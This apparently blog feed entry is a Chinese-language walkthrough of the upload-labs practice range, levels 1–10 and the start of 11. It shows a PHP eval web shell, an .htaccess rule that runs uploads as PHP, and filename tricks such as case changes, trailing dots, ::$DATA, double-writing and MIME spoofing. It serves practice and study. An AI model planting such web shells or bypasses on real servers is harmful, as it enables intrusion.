<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title>Milkii0的秘密花园 • Posts by &#34;文件上传靶场&#34; tag</title>
    <link href="http://example.com" />
    <updated>2020-11-25T13:24:52.000Z</updated>
    <category term="Java反序列化" />
    <category term="ysoserial调试" />
    <category term="文件上传靶场" />
    <category term="web,HTTP" />
    <category term="redis,未授权,漏洞利用" />
    <category term="前后端分离" />
    <category term="木马,汇总" />
    <category term="pikachu,web靶场" />
    <category term="webgoat" />
    <category term="dorabox,靶场练习" />
    <category term="sql注入靶场" />
    <entry>
        <id>http://example.com/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/</id>
        <title>upload-labs基础关卡</title>
        <link rel="alternate" href="http://example.com/2020/11/25/dmx/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/"/>
        <content type="html">&lt;h1 id=&#34;pass-01&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-01&#34;&gt;#&lt;/a&gt; Pass-01&lt;/h1&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;第一关，通常随便传把哈哈哈&lt;/p&gt;
&lt;p&gt;来个 php 一句话&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	@&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hqxx&amp;#x27;&lt;/span&gt;]);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;哦豁，弹窗提示了：该文件不允许上传，请上传.jpg|.png|.gif 类型的文件，当前文件类型为：.php&lt;/p&gt;
&lt;p&gt;弹窗提示，没有发请求包，说明是前端验证了，那就去找 js 验证代码，干掉他&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;方法 1：Ctrl+F 找哪个标签用了这个函数，删掉它，然后点击上传&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;方法 2：复制 checkFile 函数，将.php 类型加进白名单，在控制台输入运行后点击上传&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function checkFile() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var file = document.getElementsByName(&amp;#x27;upload_file&amp;#x27;)[0].value;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (file == null || file == &amp;quot;&amp;quot;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        alert(&amp;quot;请选择要上传的文件!&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //定义允许上传的文件类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var allow_ext = &amp;quot;.jpg|.png|.gif|.php&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //提取上传文件的类型&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var ext_name = file.substring(file.lastIndexOf(&amp;quot;.&amp;quot;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //判断上传文件类型是否允许上传&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (allow_ext.indexOf(ext_name) == -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        var errMsg = &amp;quot;该文件不允许上传，请上传&amp;quot; + allow_ext + &amp;quot;类型的文件,当前文件类型为：&amp;quot; + ext_name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        alert(errMsg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return false;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传后通过查看器得到文件路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上菜刀&lt;/p&gt;
&lt;p&gt;菜刀没上去，上蚁剑&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-01-05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;在控台运行函数的方法，我还是一个月之前才知道的（别说 de），明明很容易想到或者尝试到的点…&lt;/p&gt;
&lt;p&gt;感觉还是要脑洞大一点，多尝试一些&lt;/p&gt;
&lt;h1 id=&#34;pass-02&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-02&#34;&gt;#&lt;/a&gt; Pass-02&lt;/h1&gt;
&lt;p&gt;date：2020-11-25 22:01:47&lt;/p&gt;
&lt;h2 id=&#34;过程-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-2&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;通过查看器，找到前端的 onsubmit 事件，但是删除后，还是判定文件类型不正确&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-02-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;并没有在前端看见 js 代码，应该是后台判断了&lt;/p&gt;
&lt;p&gt;看一下提示：本 pass 在服务端对数据包的 MIME 进行检查！&lt;/p&gt;
&lt;p&gt;上传文件，bp 抓包，更改 MIME 类型为 image/png，同时得到路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-02-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上蚁剑连接即可。&lt;/p&gt;
&lt;h2 id=&#34;总结-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-2&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;真百度了好多次了，每次都忘记&lt;/p&gt;
&lt;p&gt;“MIME 的全称是 Multipurpose Internet Mail Extensions, 即多用途互联网邮件扩展类型。 这是 HTTP 协议中用来定义文档性质及格式的标准。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件类型&lt;/th&gt;
&lt;th&gt;后缀&lt;/th&gt;
&lt;th&gt;数据包中的文件类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;超文本标记语言文本&lt;/td&gt;
&lt;td&gt;.html&lt;/td&gt;
&lt;td&gt;text/html&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;xml 文档&lt;/td&gt;
&lt;td&gt;.xml&lt;/td&gt;
&lt;td&gt;text/xml&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;普通文本文档&lt;/td&gt;
&lt;td&gt;.text&lt;/td&gt;
&lt;td&gt;text/plain&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;RTF 文本&lt;/td&gt;
&lt;td&gt;.rtf&lt;/td&gt;
&lt;td&gt;application/rtf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PDF 文档&lt;/td&gt;
&lt;td&gt;.pdf&lt;/td&gt;
&lt;td&gt;application/pdf&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Miscrosoft Word 文件&lt;/td&gt;
&lt;td&gt;.word&lt;/td&gt;
&lt;td&gt;application/msword&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PNG 图像&lt;/td&gt;
&lt;td&gt;.png&lt;/td&gt;
&lt;td&gt;image/png&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;GIF 图形&lt;/td&gt;
&lt;td&gt;.gif&lt;/td&gt;
&lt;td&gt;image/gif&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;JPEG 图形&lt;/td&gt;
&lt;td&gt;.jpeg,.jpg&lt;/td&gt;
&lt;td&gt;image/jpeg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;任意的二进制数据&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;application/octet-stream&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;pass-03&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-03&#34;&gt;#&lt;/a&gt; Pass-03&lt;/h1&gt;
&lt;p&gt;date：2020-11-25 22:53:30&lt;/p&gt;
&lt;h2 id=&#34;过程-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-3&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;不废话直接传 php 上爆破抓包，send to repeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-02-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据上传 php 文件后的提示，非常有理由认为后台设置了后缀的黑名单&lt;/p&gt;
&lt;p&gt;大小写绕过，没绕过去，空格绕过去了但是不解析，那既然是黑名单，就把后缀改成 php4 呗&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-03-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上蚁剑连接的时候，脚本改成 php4 类型的就可以了&lt;/p&gt;
&lt;h2 id=&#34;总结-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-3&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;据说，空格可以那啥，windows 会忽略空格和点，可是我上传成功不能解析&lt;/p&gt;
&lt;p&gt;然后 00 截断上传，右键看源代码是我的一句话，后来查了一下截断上传的条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;php 版本小于 5.3.29&lt;/li&gt;
&lt;li&gt;magic_quotes_gpc = Off&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;唉&lt;/p&gt;
&lt;h1 id=&#34;pass-04&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-04&#34;&gt;#&lt;/a&gt; Pass-04&lt;/h1&gt;
&lt;p&gt;date：2020-11-25 23:03:25&lt;/p&gt;
&lt;h2 id=&#34;过程-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-4&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;提示：&lt;/p&gt;
&lt;p&gt;本 pass 禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 后缀文件！&lt;/p&gt;
&lt;p&gt;看了下源码空格大小写啥的，都被弄了&lt;/p&gt;
&lt;p&gt;但是没有过滤.htaccess 后缀&lt;/p&gt;
&lt;p&gt;要启用.htaccess，要更改 httpd.conf&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;AllowOverride None &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;更改为：AllowOverride All&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-04-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;去掉框住这行的注释符号&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-04-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传.htaccess，所有文件都会解析为 php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SetHandler application/x-httpd-php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后上传 hqxx.png 图片马&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; phpinfo(); &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;题目也给了路径了，地址栏直接输入就行&lt;/p&gt;
&lt;h2 id=&#34;总结-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-4&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;我最后也没把.png 解析 php 成功&lt;/p&gt;
&lt;p&gt;在.htaccess 里面随便输错误字符，报 500，去看 apache 的日志说我输入的错误字符不对，说明我上传的.htaccess 文件是被解析了的&lt;/p&gt;
&lt;p&gt;把 httpd.conf 里面所有的 AllowOverride None 都改成了 AllowOverride All，重写模块也开了，文件路径也没有问题，php 版本也调低了，phpstudy 也重启了，但永远就是这样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-04-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;我觉得应该还是配置文件的问题，可是到底是哪里出了问题啊！！！&lt;/p&gt;
&lt;p&gt;而后修改 htaccess 为，把文件名包含 hqxx 的文件全部以 php 解析:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;FilesMatch &amp;quot;hqxx&amp;quot; &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SetHandler application/x-httpd-php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现 a.php 可以解析成功，而 hqxx.php 不能解析，我真真真呵呵了&lt;/p&gt;
&lt;p&gt;找了好久终于发现有一个人和我一样的问题了，哭唧唧&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.zhaosimeng.cn/zqzb/55.html&#34;&gt;谢谢大哥&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在新版中 php 环境默认都是带 nts 的，而在旧版本中则可以选择不带，选一个不带 nts 的 php 版本就可以正常玩了，但是我的 phpstudy 里的 php 全是带 nts 的，谢谢您了&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;.htaccess 上传漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;漏洞形成条件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;apache 服务器&lt;/li&gt;
&lt;li&gt;能够上传.htaccess 文件，一般为黑名单限制。&lt;/li&gt;
&lt;li&gt;AllowOverride All，默认配置为关闭 None。&lt;/li&gt;
&lt;li&gt;LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态&lt;/li&gt;
&lt;li&gt;上传目录具有可执行权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.htaccess 文件 (或者 &amp;quot;分布式配置文件&amp;quot;）, 全称是 Hypertext Access (超文本入口)。&lt;/p&gt;
&lt;p&gt;概述来说，htaccess 文件是&lt;a href=&#34;https://baike.baidu.com/item/Apache&#34;&gt; Apache&lt;/a&gt; 服务器中的一个配置文件，它负责相关目录下的网页配置。&lt;/p&gt;
&lt;p&gt;启用.htaccess，需要修改 httpd.conf，启用 AllowOverride，并可以用 AllowOverride 限制特定命令的使用。&lt;/p&gt;
&lt;p&gt;.htaccess 的主要作用就是实现 url 改写，也就是当浏览器通过 url 访问到服务器某个文件夹时，作为主人，我们可以来接待这个 url，具体地怎样接待它，就是此文件的作用。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/gyrgyr/p/10773118.html&#34;&gt;.htaccess 使用方法介绍&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;pass-05&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-05&#34;&gt;#&lt;/a&gt; Pass-05&lt;/h1&gt;
&lt;h2 id=&#34;过程-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-5&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，已经不让上传.htaccess 了，但是这次没有把后缀名全转成小写了，也就是说嘿嘿嘿&lt;/p&gt;
&lt;p&gt;上传 hqxx.phP&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传成功，地址栏直接输入路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-05-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-5&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;我把 apache 玩崩了，重装都不行，换了 Nginx 哈哈哈&lt;/p&gt;
&lt;p&gt;顺便查了下 nginx 用 htaccess 的方法，&lt;a href=&#34;https://blog.csdn.net/cs729298/article/details/77478155&#34;&gt;想看点我&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;pass-06&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-06&#34;&gt;#&lt;/a&gt; Pass-06&lt;/h1&gt;
&lt;h2 id=&#34;过程-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-6&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，依然是黑名单&lt;/p&gt;
&lt;p&gt;并且将后缀名全部转换为小写了，但是空格啥的没去除了&lt;/p&gt;
&lt;p&gt;在文件名末尾加一个空格上传&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-06-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;解析成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-06-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-6&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;利用 Windows 特性 在 Windows 中文件后缀名末尾有空格会自动去掉&lt;/p&gt;
&lt;h1 id=&#34;pass-07&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-07&#34;&gt;#&lt;/a&gt; Pass-07&lt;/h1&gt;
&lt;h2 id=&#34;过程-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-7&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，转换了大小写，去除了首位空格&lt;/p&gt;
&lt;p&gt;那就在文件末尾加。呗&lt;/p&gt;
&lt;p&gt;上传成功，解析成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-07-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-7&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;下一题&lt;/p&gt;
&lt;h1 id=&#34;pass-08&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-08&#34;&gt;#&lt;/a&gt; Pass-08&lt;/h1&gt;
&lt;h2 id=&#34;过程-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-8&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;上传 hqxx.php::DATA&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-08-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-8&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;利用 windows 特性：&lt;/p&gt;
&lt;p&gt;必须是 windows, 必须是 php, 必须是那个源文件&lt;br&gt;
 php 在 window 的时候如果文件名后加上 &amp;quot;::$DATA&amp;quot;&lt;/p&gt;
&lt;p&gt;会把 &amp;quot;::$DATA&amp;quot; 之后的数据当成文件流处理，不会检测后缀名&lt;/p&gt;
&lt;p&gt;且保持 &amp;quot;::$DATA&amp;quot; 之前的文件名&lt;/p&gt;
&lt;p&gt;他的目的就是不检查后缀名&lt;/p&gt;
&lt;p&gt;改源代码测试了一下，其实和。空格是一样的，就是利用 windows 特性绕过黑名单，上传到文件夹时，文件后面的 &amp;quot;::DATA…&amp;quot; 已经被去掉了&lt;/p&gt;
&lt;h1 id=&#34;pass-09&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-09&#34;&gt;#&lt;/a&gt; Pass-09&lt;/h1&gt;
&lt;h2 id=&#34;过程-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-9&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看提示：本 pass 只允许上传.jpg|.png|.gif 后缀的文件！&lt;/p&gt;
&lt;p&gt;看了源码发现，你这个骗子，明明还是黑名单，下次不看提示了&lt;/p&gt;
&lt;p&gt;看源码：先删除了末尾的点，然后去掉了::$DATA，后缀转成了小写，最后去除首尾空格&lt;/p&gt;
&lt;p&gt;那就 hqxx.php. .&lt;/p&gt;
&lt;p&gt;这样最后在末尾就留下了一个点，上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-09-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-9&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;跟着代码逻辑走～，可是黑盒都看不到源代码唉&lt;/p&gt;
&lt;h1 id=&#34;pass-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-10&#34;&gt;#&lt;/a&gt; Pass-10&lt;/h1&gt;
&lt;h2 id=&#34;过程-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-10&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;哈哈哈，源代码注释没了&lt;/p&gt;
&lt;p&gt;先去除文件名中的所有空格，再把文件名中所有在黑名单中存在的字符置空&lt;/p&gt;
&lt;p&gt;那么就，双写，成功绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-10-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-10&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;下一题&lt;/p&gt;
&lt;h1 id=&#34;pass-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-11&#34;&gt;#&lt;/a&gt; Pass-11&lt;/h1&gt;
&lt;h2 id=&#34;过程-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-11&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;观摩源代码，发现是白名单，允许的类型有’jpg’,‘png’,‘gif’，而且还给文件重命名了&lt;/p&gt;
